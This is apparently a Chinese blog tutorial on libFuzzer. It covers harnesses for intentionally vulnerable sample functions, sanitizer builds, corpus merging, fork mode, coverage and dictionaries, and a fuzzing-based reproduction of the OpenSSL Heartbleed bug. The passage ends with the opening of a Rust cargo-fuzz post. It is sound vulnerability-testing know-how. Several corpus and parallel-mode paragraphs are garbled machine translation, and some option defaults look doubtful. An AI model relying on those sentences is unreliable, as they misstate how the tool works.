target_hash;<br>&#125;<br></code></pre></td></tr></table></figure><ul><li>编写fuzzer</li></ul><p>与第一个 fuzzer 基本相同。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;vulnerable_functions.h&quot;</span></span><br><br><span class="hljs-keyword">extern</span> <span class="hljs-string">&quot;C&quot;</span> <span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">LLVMFuzzerTestOneInput</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">uint8_t</span> *data, <span class="hljs-type">size_t</span> size)</span> </span>&#123;<br>  <span class="hljs-built_in">VulnerableFunction2</span>(data, size, <span class="hljs-literal">false</span>);<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><ul><li>编译</li></ul><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">clang++ -g -std=c++11 -fsanitize=address,fuzzer second_fuzzer.cc -o second_fuzzer<br></code></pre></td></tr></table></figure><ul><li>运行</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">mkdir</span> corpus2<br>./second_fuzzer corpus2<br></code></pre></td></tr></table></figure><h3 id="示例3"><a href="#示例3" class="headerlink" title="示例3"></a>示例3</h3><ul><li>示例 3 函数</li></ul><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-keyword">constexpr</span> std::<span class="hljs-type">size_t</span> kZn2016VerifyHashFlag = <span class="hljs-number">0x0001000</span>;<br><br><span class="hljs-function"><span class="hljs-type">bool</span> <span class="hljs-title">VulnerableFunction3</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">uint8_t</span>* data, <span class="hljs-type">size_t</span> size, std::<span class="hljs-type">size_t</span> flags)</span> </span>&#123;<br>  <span class="hljs-type">bool</span> verify_hash = flags &amp; kZn2016VerifyHashFlag;<br>  <span class="hljs-keyword">return</span> <span class="hljs-built_in">VulnerableFunction2</span>(data, size, verify_hash);<br>&#125;<br></code></pre></td></tr></table></figure><p>它实际上只是对之前那个易受攻击的函数的一个包装，关键点在于 <code>flags</code> 的可能值空间很大。</p><p><strong>注意</strong>：假设有多个不同的 <code>flags</code> 值是可能的。如果你需要灵感，可以参考 <code>open()</code> 函数的 <code>flags</code> 和 <code>mode</code> 参数的可能值。</p><p>枚举所有可能的组合在模糊测试器中似乎不合理。并且没有保证将来不会添加新的可能值。</p><p>在这种情况下，我们可以通过使用 <code>libFuzzer</code> 提供的数据来对 <code>flags</code> 值进行随机化：</p><ul><li>fuzzer</li></ul><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;vulnerable_functions.h&quot;</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;functional&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string&gt;</span></span><br><br><span class="hljs-keyword">extern</span> <span class="hljs-string">&quot;C&quot;</span> <span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">LLVMFuzzerTestOneInput</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">uint8_t</span> *data, <span class="hljs-type">size_t</span> size)</span> </span>&#123;<br>  <span class="hljs-function">std::string <span class="hljs-title">data_string</span><span class="hljs-params">(<span class="hljs-keyword">reinterpret_cast</span>&lt;<span class="hljs-type">const</span> <span class="hljs-type">char</span>*&gt;(data), size)</span></span>;<br>  <span class="hljs-keyword">auto</span> data_hash = std::<span class="hljs-built_in">hash</span>&lt;std::string&gt;()(data_string);<br><br>  std::<span class="hljs-type">size_t</span> flags = <span class="hljs-built_in">static_cast</span>&lt;<span class="hljs-type">size_t</span>&gt;(data_hash);<br>  <span class="hljs-built_in">VulnerableFunction3</span>(data, size, flags);<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><ul><li>编译</li></ul><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">clang++ -g -std=c++11 -fsanitize=address,fuzzer fourth_fuzzer.cc -o fourth_fuzzer<br></code></pre></td></tr></table></figure><ul><li>运行</li></ul><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell">mkdir corpus3<br>./fourth_fuzzer corpus3/ -max_len=1024<br></code></pre></td></tr></table></figure><ul><li><code>-max_total_time</code>：设置最大运行时间</li><li><code>-print_final_stats</code>：打印最终统计信息</li><li><code>-max_len</code>：设置最大输入长度</li></ul><p>使用 <code>-fsanitize=fuzzer</code> 编译标志来构建目标二进制文件。推荐将 libFuzzer 与各种 Sanitizers（如 AddressSanitizer、UndefinedBehaviorSanitizer、MemorySanitizer）结合使用：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">clang -g -O1 -fsanitize=fuzzer mytarget.c        <span class="hljs-comment"># 不带 sanitizers 的模糊测试目标</span><br>clang -g -O1 -fsanitize=fuzzer,address mytarget.c  <span class="hljs-comment"># 带 ASAN 的模糊测试目标</span><br>clang -g -O1 -fsanitize=fuzzer,signed-integer-overflow mytarget.c  <span class="hljs-comment"># 带 UBSAN 的模糊测试目标</span><br>clang -g -O1 -fsanitize=fuzzer,memory mytarget.c  <span class="hljs-comment"># 带 MSAN 的模糊测试目标</span><br></code></pre></td></tr></table></figure><h2 id="语料库优化"><a href="#语料库优化" class="headerlink" title="语料库优化"></a>语料库优化</h2><p>libFuzzer 使用一个输入语料库作为模糊测试的基础，语料库应包含有效和无效的输入样本。模糊测试通过变异语料库中的样本生成新的输入，触发新的代码路径。</p><p>覆盖率引导的模糊测试器（如 libFuzzer）依赖于 被测代码。理想情况下，这个语料库应该包含各种集合 被测代码的有效和无效输入;例如，对于图形 库初始语料库可能包含各种不同的小 PNG&#x2F;JPG&#x2F;GIF 文件。模糊测试器根据 当前语料库。如果突变触发了先前发现的 path 中，则该 mutation 将保存到 未来变化。</p><p>LibFuzzer 可以在没有任何初始种子的情况下工作，但会更少 如果被测库接受 complex，则为 efficient， 结构化输入。</p><p>语料库还可以充当健全性&#x2F;回归检查，以确认 模糊测试入口点仍然有效，并且所有示例输入都通过 被测代码没有问题。</p><p>如果您有一个大型语料库（通过模糊测试生成或通过其他方式获取） 您可能希望将其最小化，同时仍保留完整覆盖范围。一种方法 是使用 -merge&#x3D;1 标志：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell">mkdir NEW_CORPUS_DIR  # Store minimized corpus here.<br>./my_fuzzer -merge=1 NEW_CORPUS_DIR FULL_CORPUS_DIR<br></code></pre></td></tr></table></figure><p>您可以使用相同的标志将更多有趣的项目添加到现有语料库中。 只有触发新覆盖率的输入才会被添加到第一个语料库中。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">./my_fuzzer -merge=1 CURRENT_CORPUS_DIR NEW_POTENTIALLY_INTERESTING_INPUTS_DIR<br></code></pre></td></tr></table></figure><p><strong>构建语料库：</strong></p><p>可以通过 <code>-merge=1</code> 标志来最小化语料库，并将新的、有趣的输入添加到现有语料库中：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">mkdir</span> NEW_CORPUS_DIR  <span class="hljs-comment"># 存储最小化后的语料库</span><br>./my_fuzzer -merge=1 NEW_CORPUS_DIR FULL_CORPUS_DIR<br></code></pre></td></tr></table></figure><p>指定语料库</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell">mkdir dir1 <br>./demo-fuzzer dir1/ dir2/ dir3/ ...<br></code></pre></td></tr></table></figure><p>语料库裁剪</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell">mkdir corpus1_min <br>./demo-fuzzer -merge=1 merge/ dir1/ dir2 ...<br></code></pre></td></tr></table></figure><p>-dict 参数指定一个语料库,后续ManualDict这些数据变异模块就可以从这里拿到和当前被测试的逻辑 强相关的关键词.举个例子,我们对SQL注入做测试,这些关键词是不是就包含了:union select,from,count() 等;对文件解析测试,是不是就需要包含7zip,PE,MZ,Rar!等关键词呢.我们传递的这些关键词,最终会被拼接 到LLVMFuzzerTestOneInput()的data参数中. 实际上,libFuzzer也能够像AFL一样接受一批样本数据作为初始化输入来做模糊测试.这样的话我们就可以 根据模糊测试的对象的业务去github和各个项目的测试用例中搜罗样本数据了. 上面两个参数是可以结合使用的,不带参数和带参数的对路径探测的结果影响如下</p><ul><li><ul><li><p><strong><code>crash-&lt;sha1&gt;</code></strong>：触发崩溃的输入。</p><ul><li><p><strong><code>leak-&lt;sha1&gt;</code></strong>：引发内存泄漏的输入。</p></li><li><p><strong><code>timeout-&lt;sha1&gt;</code></strong>：导致程序超时的输入。</p></li></ul></li></ul></li><li><p>libFuzzer 会自动生成新的输入样本，试图触发更多的代码路径。如果某个新生成的输入能够触发一个未曾执行过的路径（即新的覆盖率），libFuzzer 会认为这个输入是“有趣的”，并将其保存到 <code>CORPUS_DIR</code> 目录中。</p></li><li><p>这样，随着时间的推移，<code>CORPUS_DIR</code> 会积累更多的有趣的输入样本，这些样本能够有效地提高测试的覆盖率。</p></li></ul><h2 id="并行模糊测试"><a href="#并行模糊测试" class="headerlink" title="并行模糊测试"></a>并行模糊测试</h2><p>每个 libFuzzer 进程都是单线程的，除非受测库启动它自己的线程。但是，可以在与共享语料库目录并行；这样做的好处是，任何新的一个模糊测试程序进程找到的输入将可供另一个模糊测试程序使用进程（除非您使用选项禁用此功能）。<code>-reload=0</code></p><p>libFuzzer 支持通过多进程或多线程的方式来并行化模糊测试。你可以通过设置多个实例运行 <code>libFuzzer</code>，每个实例都有自己的输入 Corpus，并且共享一个全局的结果。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">./fuzzer -jobs=10 CORPUS<br></code></pre></td></tr></table></figure><p>这主要由选项控制，这表明 应运行 N 个模糊测试作业直到完成（即直到发现错误或 达到时间&#x2F;迭代限制）。这些作业将在一组 worker 进程，默认情况下使用一半的可用 CPU 内核;的 Count worker 进程可以被 option 覆盖。例如 在 12 核机器上运行 将默认运行 6 个 worker， 每个 worker 在完成整个过程时平均有 5 个 bug。<code>-jobs=N``-workers=N``-jobs=30</code></p><h2 id="Fork-模式"><a href="#Fork-模式" class="headerlink" title="Fork 模式"></a>Fork 模式</h2><p>libFuzzer 默认在单进程模式下运行，而 Fork 模式通过多子进程+父进程调度的方式运行。</p><p>Fork 模式允许通过独立的子进程执行模糊测试，提高内存溢出、超时和崩溃的容错性。往往在 Fuzz 大规模的程序时我们才会通过 Fork 模式进行并行化的 Fuzz。</p><p>参数说明：</p><ul><li><code>-fork=N</code>：启用 Fork 模式，开启 N 个子进程并行 fuzz。父进程负责协调语料、调度和崩溃合并。</li><li><code>-jobs=N</code>：并行作业数量。与 <code>-workers</code> 配合使用，推荐用于分布式&#x2F;CI 等现代调度场景。</li><li><code>-workers=N</code>：每个 job 中的工作线程数。</li><li><code>-ignore_ooms=1</code>：如果子进程发生 OOM，继续 fuzz，保存问题输入。</li><li><code>-ignore_timeouts=1</code>：如果子进程超时，继续 fuzz，保存问题输入。</li><li><code>-ignore_crashes=0</code>：默认遇到崩溃会中止 fuzz，可设置为 1 忽略并继续。</li></ul><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">./my_fuzzer -fork=4 corpus/ -ignore_crashes=1<br></code></pre></td></tr></table></figure><p>或：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">./my_fuzzer -jobs=4 -workers=1 corpus/ -ignore_crashes=1<br></code></pre></td></tr></table></figure><h2 id="合并恢复"><a href="#合并恢复" class="headerlink" title="合并恢复"></a>合并恢复</h2><p><strong>合并恢复</strong>（<strong>merge recovery</strong>）是 LibFuzzer 在执行语料库合并时的一种<strong>中断恢复机制</strong>。它的作用是在合并语料库（corpus）过程中，如果因为某些原因（比如崩溃、系统中断或人为终止）导致合并没有完成，可以<strong>从中断的位置继续合并</strong>，而不是从头开始。</p><p>如果合并大型语料库时出现中断，可以使用 <strong>-merge_control_file</strong> 标志来恢复合并进程：</p><ol><li><p>开始合并时创建控制文件：</p> <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">./my_fuzzer CORPUS1 CORPUS2 -merge=1 -merge_control_file=SomeLocalPath<br></code></pre></td></tr></table></figure></li><li><p>若进程中断，可以在另一个终端恢复合并：</p> <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">killall -SIGUSR1 my_fuzzer<br></code></pre></td></tr></table></figure></li></ol><ul><li><p><strong>-help</strong>：打印帮助信息。</p></li><li><p><strong>-seed&#x3D;N</strong>：设置随机种子，默认值为 0。</p></li><li><p><strong>-runs&#x3D;N</strong>：设置测试运行次数，默认为 -1（无限次运行）。</p></li><li><p><strong>-max_len&#x3D;N</strong>：设置输入最大长度，默认 0。</p></li><li><p><strong>-timeout&#x3D;N</strong>：设置超时秒数，默认 1200 秒。</p></li><li><p><strong>-rss_limit_mb&#x3D;N</strong>：设置内存限制，默认 2048 MB。</p></li><li><p><strong>-merge</strong>：如果为 1，新的输入将被合并到种子目录中。</p></li><li><p><strong>-reload</strong>：如果为 1，模糊器定期重新加载种子目录。</p></li></ul><p>输出信息：</p><p>模糊测试过程中的输出信息包括：</p><ul><li><p><strong>INITED</strong>：初始化完成，开始测试。</p></li><li><p><strong>NEW</strong>：生成新的测试输入，触发新路径。</p></li><li><p><strong>REDUCE</strong>：找到更小的输入，触发之前发现的特性。</p></li><li><p><strong>DONE</strong>：测试完成。</p></li></ul><p>输出还包含关于测试进展、覆盖率和内存消耗的详细信息。</p><p>合并大型语料库可能很耗时，而且这样做通常是可取的 在可抢占的 VM 上，进程可能随时被终止。 为了无缝恢复合并，请使用 flag 和 use 以正常停止合并。例：<code>-merge_control_file``killall -SIGUSR1 /path/to/fuzzer/binary</code></p><figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs n1ql">% rm -f SomeLocalPath<br>% ./my_fuzzer CORPUS1 CORPUS2 -<span class="hljs-keyword">merge</span>=<span class="hljs-number">1</span> -merge_control_file=SomeLocalPath<br>...<br><span class="hljs-keyword">MERGE</span>-<span class="hljs-keyword">INNER</span>: <span class="hljs-keyword">using</span> the control file <span class="hljs-string">&#x27;SomeLocalPath&#x27;</span><br>...<br># <span class="hljs-keyword">While</span> this <span class="hljs-keyword">is</span> running, <span class="hljs-keyword">do</span> <span class="hljs-symbol">`killall -SIGUSR1 my_fuzzer`</span> <span class="hljs-keyword">in</span> another console<br>==<span class="hljs-number">9015</span>== INFO: libFuzzer: exiting <span class="hljs-keyword">as</span> requested<br><br># This will leave the file SomeLocalPath <span class="hljs-keyword">with</span> the partial state of the <span class="hljs-keyword">merge</span>.<br># Now, you can <span class="hljs-keyword">continue</span> the <span class="hljs-keyword">merge</span> <span class="hljs-keyword">by</span> executing the same command. The <span class="hljs-keyword">merge</span><br># will <span class="hljs-keyword">continue</span> <span class="hljs-keyword">from</span> <span class="hljs-keyword">where</span> it has been interrupted.<br>% ./my_fuzzer CORPUS1 CORPUS2 -<span class="hljs-keyword">merge</span>=<span class="hljs-number">1</span> -merge_control_file=SomeLocalPath<br>...<br><span class="hljs-keyword">MERGE</span>-<span class="hljs-keyword">OUTER</span>: non-empty control file provided: <span class="hljs-string">&#x27;SomeLocalPath&#x27;</span><br><span class="hljs-keyword">MERGE</span>-<span class="hljs-keyword">OUTER</span>: control file ok, <span class="hljs-number">32</span> files total, <span class="hljs-keyword">first</span> <span class="hljs-keyword">not</span> processed file <span class="hljs-number">20</span><br>...<br></code></pre></td></tr></table></figure><h2 id="覆盖率分析"><a href="#覆盖率分析" class="headerlink" title="覆盖率分析"></a>覆盖率分析</h2><h3 id="简介-1"><a href="#简介-1" class="headerlink" title="简介"></a>简介</h3><p>LibFuzzer 使用 <strong>基于 SanitizerCoverage（SanCov）</strong> 的插桩方式记录哪些代码路径已经被执行过。它依赖 LLVM 编译器提供的功能，在编译时插入探针代码，以便在运行时收集覆盖率信息。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">clang++ -fsanitize=fuzzer -fsanitize-coverage=trace-pc-guard -g your_target.cc -o fuzzer_target<br></code></pre></td></tr></table></figure><ul><li><code>-fsanitize=fuzzer</code>：启用 libFuzzer 驱动；</li><li><code>-fsanitize-coverage=trace-pc-guard</code>：在每个基本块插入 PC 路径追踪代码；</li></ul><p>每当 Fuzzer 执行一次输入，它会：</p><ol><li>收集当前输入触发的路径哈希；</li><li>判断是否是新的路径；</li><li>如果是新路径，将该输入加入语料库</li></ol><h3 id="查看覆盖率信息"><a href="#查看覆盖率信息" class="headerlink" title="查看覆盖率信息"></a>查看覆盖率信息</h3><ul><li>编译目标并生成覆盖率信息</li></ul><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">clang++ -fsanitize=fuzzer -fprofile-instr-generate -fcoverage-mapping your_target.cc -o fuzzer_target<br></code></pre></td></tr></table></figure><ul><li>运行 Fuzzer 收集 profile 信息</li></ul><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">LLVM_PROFILE_FILE=&quot;coverage.profraw&quot; ./fuzzer_target corpus/<br></code></pre></td></tr></table></figure><ul><li>使用 <code>llvm-profdata</code> 合并 profile 数据</li></ul><figure class="highlight cos"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cos">llvm-profdata <span class="hljs-keyword">merge</span> -sparse coverage.profraw -o coverage.profdata<br></code></pre></td></tr></table></figure><ul><li>使用 <code>llvm-cov</code> 生成可读的覆盖率报告</li></ul><figure class="highlight maxima"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs maxima">llvm-<span class="hljs-built_in">cov</span> <span class="hljs-built_in">show</span> ./fuzzer_target -instr-profile=coverage.profdata your_target.cc<br></code></pre></td></tr></table></figure><ul><li>生成 HTML 报告</li></ul><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">llvm-cov show ./fuzzer_target -instr-profile=coverage.profdata -format=html -output-dir=coverage_html<br></code></pre></td></tr></table></figure><h2 id="字典支持"><a href="#字典支持" class="headerlink" title="字典支持"></a>字典支持</h2><ul><li>字典构成</li></ul><p>字典每一行都是一个可被插入、替换或拼接到输入中的字符串或字节片段。在 Fuzz 过程中</p><p>用双引号包裹，特殊字符需要转义。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs dict">&quot;GET&quot;<br>&quot;POST&quot;<br>&quot;Content-Type:&quot;<br>&quot;username=&quot;<br>&quot;&#123;\&quot;key\&quot;:&quot;<br>&quot;\r\n&quot;<br></code></pre></td></tr></table></figure><ul><li>使用字典</li></ul><p>通过<code>-dict</code>参数指定使用的字典。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">./fuzzer corpus -dict=demo.dict<br></code></pre></td></tr></table></figure><h2 id="自动生成fuzzer"><a href="#自动生成fuzzer" class="headerlink" title="自动生成fuzzer"></a>自动生成fuzzer</h2><h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>复现著名的心脏滴血漏洞。</p><p>openssl-1.0.1f - Heartbleed</p><h3 id="编译项目"><a href="#编译项目" class="headerlink" title="编译项目"></a>编译项目</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs shell">git clone https://github.com/google/fuzzer-test-suite.git<br>./openssl-1.0.1f/build.sh<br>tar xzf openssl1.0.1f.tgz<br>cd openssl1.0.1f/<br><br>./config<br>make clean<br>make CC=&quot;clang -O2 -fno-omit-frame-pointer -g -fsanitize=address,fuzzer-no-link -fsanitize-coverage=trace-cmp,trace-gep,trace-div&quot; -j$(nproc)<br></code></pre></td></tr></table></figure><h3 id="编写fuzzer"><a href="#编写fuzzer" class="headerlink" title="编写fuzzer"></a>编写fuzzer</h3><ul><li>fuzzer</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// Copyright 2016 Google Inc. All Rights Reserved.</span><br><span class="hljs-comment">// Licensed under the Apache License, Version 2.0 (the &quot;License&quot;);</span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;openssl/ssl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;openssl/err.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;assert.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdint.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stddef.h&gt;</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">ifndef</span> CERT_PATH</span><br><span class="hljs-meta"># <span class="hljs-keyword">define</span> CERT_PATH</span><br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><br>SSL_CTX *<span class="hljs-title function_">Init</span><span class="hljs-params">()</span> &#123;<br>  SSL_library_init();<br>  SSL_load_error_strings();<br>  ERR_load_BIO_strings();<br>  OpenSSL_add_all_algorithms();<br>  SSL_CTX *sctx;<br>  assert (sctx = SSL_CTX_new(TLSv1_method()));<br>  <span class="hljs-comment">/* These two file were created with this command:</span><br><span class="hljs-comment">      openssl req -x509 -newkey rsa:512 -keyout server.key \</span><br><span class="hljs-comment">     -out server.pem -days 9999 -nodes -subj /CN=a/</span><br><span class="hljs-comment">  */</span><br>  assert(SSL_CTX_use_certificate_file(sctx, CERT_PATH <span class="hljs-string">&quot;server.pem&quot;</span>,<br>                                      SSL_FILETYPE_PEM));<br>  assert(SSL_CTX_use_PrivateKey_file(sctx, CERT_PATH <span class="hljs-string">&quot;server.key&quot;</span>,<br>                                     SSL_FILETYPE_PEM));<br>  <span class="hljs-keyword">return</span> sctx;<br>&#125;<br><br><span class="hljs-keyword">extern</span> <span class="hljs-string">&quot;C&quot;</span> <span class="hljs-type">int</span> <span class="hljs-title function_">LLVMFuzzerTestOneInput</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">uint8_t</span> *Data, <span class="hljs-type">size_t</span> Size)</span> &#123;<br>  <span class="hljs-type">static</span> SSL_CTX *sctx = Init();<br>  SSL *server = SSL_new(sctx);<br>  BIO *sinbio = BIO_new(BIO_s_mem());<br>  BIO *soutbio = BIO_new(BIO_s_mem());<br>  SSL_set_bio(server, sinbio, soutbio);<br>  SSL_set_accept_state(server);<br>  BIO_write(sinbio, Data, Size);<br>  SSL_do_handshake(server);<br>  SSL_free(server);<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>构建：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs shell">clang++ -g openssl_fuzzer.cc -O2 -fno-omit-frame-pointer -fsanitize=address,fuzzer \<br>    -fsanitize-coverage=trace-cmp,trace-gep,trace-div \<br>    -Iopenssl1.0.1f/include openssl1.0.1f/libssl.a openssl1.0.1f/libcrypto.a \<br>    -o openssl_fuzzer<br></code></pre></td></tr></table></figure><h3 id="Fuzz"><a href="#Fuzz" class="headerlink" title="Fuzz"></a>Fuzz</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell">mkdir corpus1 <br>./openssl_fuzzer ./corpus1<br></code></pre></td></tr></table></figure><h2 id="后言"><a href="#后言" class="headerlink" title="后言"></a>后言</h2><p>libFuzzer 可以和 AFL 联合加快 Fuzz 效率。比如先用 AFL 进行初步的 Fuzz 测试，使用 AFL 生成的样本进行 libFuzzer 测试。对目标函数进行专注性的模糊测试。</p><h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><blockquote><p><a href="https://llvm.org/docs/LibFuzzer.html">libFuzzer 官方文档</a><br><a href="https://bbs.kanxue.com/thread-283781.htm#msg_header_h1_0">[原创]libFuzzer模糊测试引擎调研与自定义开发</a><br><a href="https://www.secpulse.com/archives/71898.html">fuzz实战之libfuzzer - SecPulse.COM | 安全脉搏</a><br><a href="https://www.freebuf.com/articles/system/395965.html">libFuzzer漏洞挖掘总结教程 - FreeBuf网络安全行业门户</a></p></blockquote>]]></content>
      
      
      <categories>
          
          <category> Fuzz </category>
          
      </categories>
      
      
        <tags>
            
            <tag> fuzzer </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Rust Fuzz</title>
      <link href="/2025/07/01/fuzz/rust/"/>
      <url>/2025/07/01/fuzz/rust/</url>
      
        <content type="html"><![CDATA[<h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>传统的 AFL、libFuzzer 和 honggfuzz 主要支持用 C&#x2F;C++ 语言开发的项目。但是现在随着 Rust、Go 等新兴编译型语言的兴起，相应的出现了对这些语言开发的项目进行 Fuzz 的需求。因此，人们在基于传统的 Fuzz 思想的基础上，逐步为这些语言构建了专门的 Fuzz 工具。本文所要学习的 cargo-fuzz 和 afl.rs 正是如此。</p><h2 id="cargo-fuzz"><a href="#cargo-fuzz" class="headerlink" title="cargo-fuzz"></a>cargo-fuzz</h2><p>cargo-fuzz 是 Rust 代码模糊测试的推荐工具。不过，cargo-fuzz 本身并不是一个 fuzzer，而是一个调用 fuzzer 的工具。目前，它仅仅支持通过 libfuzzer-sys crate 调用 LibFuzzer。</p><h3 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h3><p>由于 libFuzzer 需要 LLVM sanitizer 支持，所以我们需要将 Rust 编译器切换至 nightly 版本</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span 